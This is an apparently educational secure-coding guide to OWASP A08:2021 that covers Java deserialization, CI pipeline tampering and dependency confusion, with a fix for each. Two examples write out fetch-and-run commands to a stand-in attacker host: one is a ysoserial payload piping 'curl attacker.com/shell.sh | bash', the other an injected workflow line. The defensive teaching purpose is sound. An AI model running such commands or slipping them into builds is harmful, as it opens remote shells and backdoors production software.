# A08:2021 – Software and Data Integrity Failures

---

## Scenario 1: Java deserialization — code executes before your code runs

Your app has an endpoint that accepts a serialized Java object from the client:

```java
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // ← this line is the problem
```

An attacker uses a tool called `ysoserial` to craft a malicious payload.
The payload is a specially constructed chain of objects from the `commons-collections`
library (which is on your classpath) that, when deserialized, calls `Runtime.exec()`.

```bash
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/shell.sh | bash" > payload.bin
curl -X POST https://example.com/api/data --data-binary @payload.bin
```

**The moment**: `readObject()` is called. Java deserializes the object graph. As it
reconstructs the objects, the library's code runs automatically — before your code even sees the result.
The `Runtime.exec()` call happens inside the JDK's deserialization machinery.
Your app never got a chance to validate anything.

The attacker now has a shell on your server.

### Fix

Never deserialize data from untrusted sources using Java's native `ObjectInputStream`.
Use JSON instead — it carries data, not executable code:

```java
ObjectMapper mapper = new ObjectMapper();
MyDto dto = mapper.readValue(request.getInputStream(), MyDto.class);
```

JSON deserialization only creates instances of the class you specify.
It cannot trigger arbitrary method calls on arbitrary library classes.

---

## Scenario 2: compromised CI/CD pipeline

Your team uses GitHub Actions. A developer's GitHub token is leaked in a public paste.

An attacker finds it. They use the token to edit your CI pipeline file:

```yaml
# .github/workflows/deploy.yml  ← attacker adds one line:
- run: curl attacker.com/backdoor.sh | bash
```

The next time a developer pushes a commit, CI runs. The backdoor script runs on the
build server. It installs a reverse shell in the compiled JAR before it's packaged.
The JAR gets deployed to production. The backdoor is now in your production app.

**The moment**: the pipeline ran with the modified config. Every downstream step
— tests, packaging, deployment — operated on a compromised artifact.
Your code was fine. The build system was the attack surface.

### Fix

- Require a code review and branch protection before any change to CI config files merges.
- Rotate tokens immediately when leaked; use short-lived OIDC tokens instead of long-lived secrets.
- Sign build artifacts after build, verify signature before deploy:

```bash
# After build
cosign sign-blob --key cosign.key app.jar > app.jar.sig

# Before deploy
cosign verify-blob --key cosign.pub --signature app.jar.sig app.jar
# Fails if the jar was modified after signing
```

---

## Scenario 3: dependency confusion

Your company uses a private npm/Maven package called `internal-utils`, published
to an internal Artifactory registry.

An attacker discovers the package name (from a job posting, a leak, a stack trace).
They publish a malicious package with the **same name** to the public Maven Central.
They give it version `9.9.9` — higher than your internal `1.2.3`.

Your build tool is configured to check public registries first.
It finds `internal-utils:9.9.9` on Maven Central, downloads it, runs its code.
The attacker's package exfiltrates environment variables to their server during the build.

**The moment**: `./gradlew build` ran and the resolver picked the public package over the internal one.

### Fix

Configure your build tool to use your internal registry exclusively, not as a fallback:

```groovy
repositories {
    maven {
        url 'https://nexus.internal/repository/maven-public'
        // do NOT add mavenCentral() after this for internal packages
    }
}
```

Or use namespace verification — internal packages must come from internal registry only.
